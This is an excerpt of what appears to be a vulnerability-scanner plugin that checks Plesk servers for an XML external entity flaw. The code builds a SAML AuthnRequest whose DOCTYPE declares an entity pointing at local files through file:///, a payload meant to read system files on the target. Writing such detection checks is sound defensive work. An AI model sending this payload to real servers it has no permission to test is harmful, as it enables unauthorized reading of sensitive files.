...
if(description){
	...
	script_dependencies( "gb_plesk_http_detect.sc", "os_detection.sc" );
...
for pattern in keys( files ) {
	file = files[pattern];
	xxe = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE doc [ <!ENTITY xxe SYSTEM \"file:///" + file + "\"> ] >" + "<samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"" + "ID=\"" + rand_str( length: 42, charset: "a-f0-9" ) + "\" Version=\"2.0\">" + "<saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>";
